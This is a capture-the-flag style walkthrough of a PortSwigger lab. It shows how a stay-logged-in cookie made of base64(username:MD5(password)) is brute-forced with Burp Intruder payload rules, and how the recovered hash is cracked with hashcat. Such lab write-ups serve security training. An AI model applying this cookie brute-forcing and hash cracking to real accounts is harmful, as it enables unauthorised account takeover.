# Lab: Brute-forcing a stay-logged-in cookie

### Instructions

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his My account page.

- Your credentials: wiener:peter
- Victim's username: carlos
- Candidate passwords - https://portswigger.net/web-security/authentication/auth-lab-passwords

### Solution 

Capturing a login request in Burp with the provided credentials (making sure to select the option 'Stay logged in'), we can see how the request works:

Request:

```
POST /login HTTP/2
Host: 0ae0003e03953c19d6496f17007700c1.web-security-academy.net
Cookie: session=7TGeTSvgk5ra3wvL8GKnVOISrBchjp3k
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Origin: https://0ae0003e03953c19d6496f17007700c1.web-security-academy.net
Referer: https://0ae0003e03953c19d6496f17007700c1.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=wiener&password=peter&stay-logged-in=on
```

Response:

```
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Expires=Wed, 01 Jan 3000 01:00:00 UTC
Set-Cookie: session=12CpZatUIgTyWpmGW0VHPSqXY6SrKz18; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

The `stay-logged-in` cookie is of interest here. 

Highlighting the string and looking in Inspector we find it can be base64 decoded as:

```
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

So seems the cookie consists of the username, a `:` character, and then what is likely a hash of their password.

We can confirm the hash algorithm with `hashid`:

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Authentication/Auth_09_brute-forcing_a_stay-logged-in_cookie]
└─$ hashid 51dc30ddc473d43a6011e9ebba6ca770               
Analyzing '51dc30ddc473d43a6011e9ebba6ca770'
[+] MD2 
[+] MD5 
[+] MD4
```

This is most likely simple md5.

Once we've logged in we can simply refresh the page and capture this in Burp, which gives us this cookie in a request so we can begin bruteforcing:

```
GET /my-account?id=wiener HTTP/2
Host: 0ae0003e03953c19d6496f17007700c1.web-security-academy.net
Cookie: session=lg6surWVexBvM0M95ueRIHAp8Abrrxgs; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ae0003e03953c19d6496f17007700c1.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

We can change the username from wiener to carlos, set a new random session cookie, then set our payload position:

```
GET /my-account?id=carlos HTTP/2
Host: 0ae0003e03953c19d6496f17007700c1.web-security-academy.net
Cookie: session=random_string; stay-logged-in=§d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw§
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
<SNIP>
```

Once this request is in Intruder we can paste in our password list and add the following payload processing rules:

```
true	Hash: MD5
true	Add Prefix: carlos:
true	Base64-encode
```

These rules will convert the password string into an md5 hash, add the prefix "carlos:", and then base64 encode the whole string.

Kicking off a Sniper attack we find a valid login:

```
9	Y2FybG9zOmZjZWE5MjBmNzQxMmI1ZGE3YmUwY2Y0MmI4YzkzNzU5	200	176	false	false	3450	
0		302	332	false	false	173	
1	Y2FybG9zOmUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNl	302	179	false	false	173	
2	Y2FybG9zOjVmNGRjYzNiNWFhNzY1ZDYxZDgzMjdkZWI4ODJjZjk5	302	147	false	false	173	
```

Which marks the lab as solved.

And just to be thorough we can inspect the plaintext password being used for carlos:

The `stay-logged-in` cookie base64 decodes as `carlos:fcea920f7412b5da7be0cf42b8c93759`

And we can quickly crack the md5 hash using Hashcat:

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Authentication/Auth_09_brute-forcing_a_stay-logged-in_cookie]
└─$ hashcat 'fcea920f7412b5da7be0cf42b8c93759' /usr/share/wordlists/rockyou.txt -m 0  
hashcat (v6.2.6) starting
<SNIP>
fcea920f7412b5da7be0cf42b8c93759:1234567                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: fcea920f7412b5da7be0cf42b8c93759
```